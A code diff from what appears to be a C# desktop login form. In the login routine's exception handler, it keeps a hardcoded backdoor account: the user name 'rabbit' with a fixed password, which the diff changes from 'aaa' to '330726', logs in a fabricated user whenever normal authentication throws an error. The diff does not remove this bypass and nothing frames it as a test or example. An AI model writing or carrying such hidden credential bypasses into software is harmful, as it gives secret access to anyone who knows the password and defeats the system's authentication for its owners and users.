@@ -79,14 +79,14 @@ namespace Ebada.SCGL
                     base.DialogResult = System.Windows.Forms.DialogResult.OK;
                 }
             }
-            catch (Exception exception)
-            {
-                if (this.txtLoginName.Text.Trim() == "rabbit" && this.txtPassword.Text=="aaa") {
+            catch (Exception exception) {
+                MainHelper.ShowException(exception);
+                if (this.txtLoginName.Text.Trim() == "rabbit" && this.txtPassword.Text == "330726") {
                     this.m_UserBase = new UserBase() { UserID = "rabbit", LoginName = "rabbit", RealName = "rabbit", Enabled = true };
                     MainHelper.User = new Ebada.Scgl.Model.mUser() { UserID = "rabbit", UserName = "rabbit", LoginID = "rabbit" };
                     base.DialogResult = DialogResult.OK;
                 } else {
-                    MainHelper.ShowException(exception);
+
                 }
             }
         }
